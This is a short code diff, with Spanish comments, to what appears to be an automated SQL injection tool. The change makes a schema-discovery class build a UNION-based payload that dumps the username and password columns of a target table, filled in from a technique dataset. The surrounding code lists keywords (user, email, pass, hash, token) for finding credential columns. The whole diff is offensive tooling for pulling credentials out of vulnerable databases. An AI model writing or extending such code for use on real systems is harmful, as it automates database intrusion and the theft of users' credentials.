@@ -20,6 +20,8 @@ import re
 from dataclasses import dataclass, field
 from typing import Callable, Optional
 
+from . import knowledge
+
 _USER_HINTS = ("user", "login", "uname", "name", "email", "mail", "account")
 _PASS_HINTS = ("pass", "pwd", "secret", "hash", "token", "credential")
 _MAX_COLUMNS = 12
@@ -159,6 +161,13 @@ class SchemaDiscovery:
 
     def build_dump_payload(self, res: DiscoveryResult) -> str:
         user_col, pass_col = res.cred_columns
+        # Técnica de extracción (UNION) tomada del DATASET y rellenada con el esquema descubierto;
+        # si el layout no es el estándar (2 columnas reflejadas) o el dataset falta, se construye
+        # de forma determinista para seguir siendo robusto.
+        templates = knowledge.extraction_techniques().get("union", [])
+        if templates and res.columns == 2 and res.reflected == [1, 2]:
+            return knowledge.fill(templates[0], q=res.quote, ucol=user_col,
+                                  pcol=pass_col, table=res.target_table)
         return self._pair(res, user_col, pass_col, f" FROM {res.target_table}")
 
     def extract(self, payload: str, res: DiscoveryResult) -> list[dict[str, str]]:
